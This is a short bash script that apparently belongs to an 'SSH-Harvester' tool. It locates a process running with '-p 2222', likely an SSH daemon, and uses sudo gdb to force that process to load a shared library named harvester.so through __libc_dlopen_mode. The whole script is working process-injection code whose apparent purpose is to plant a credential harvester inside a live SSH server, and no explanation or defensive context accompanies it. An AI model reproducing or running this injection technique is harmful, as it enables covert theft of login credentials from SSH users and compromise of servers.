#!/bin/bash

pid="$(ps -ef | grep -E "\-p\ 2222" | grep -v grep | awk '{print $2}')"
echo "Injecting to $pid"
echo 'print __libc_dlopen_mode("/home/u/SSH-Harvester/harvester.so", 2)' | sudo gdb -p "$pid"
